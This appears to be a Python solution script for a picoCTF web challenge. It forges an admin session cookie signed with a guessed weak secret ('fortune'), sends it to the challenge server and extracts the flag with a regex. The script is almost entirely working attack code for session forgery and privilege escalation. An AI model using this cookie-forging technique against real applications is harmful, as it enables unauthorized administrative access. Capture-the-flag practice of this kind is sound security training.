import requests
import jwt
import re
encoded_jwt = jwt.encode({'very_auth': 'admin'}, "fortune", algorithm="HS256")
print(encoded_jwt)
encoded_jwt = "eyJ2ZXJ5X2F1dGgiOiJhZG1pbiJ9.ZBBjOg.M6F3uM1ohKprwQcwY-zyA8A28fI"
#urlencode the jwt
s = requests.Session() 
cookie = {'session': encoded_jwt}
res = s.get('http://mercury.picoctf.net:65344', cookies=cookie)
res = s.get('http://mercury.picoctf.net:65344/display', cookies=cookie)
pettern = "picoCTF{.*}"
te = res.text
for i in te.split():
    m = re.search(pettern, i)
    if m:
        print(m.group(0))
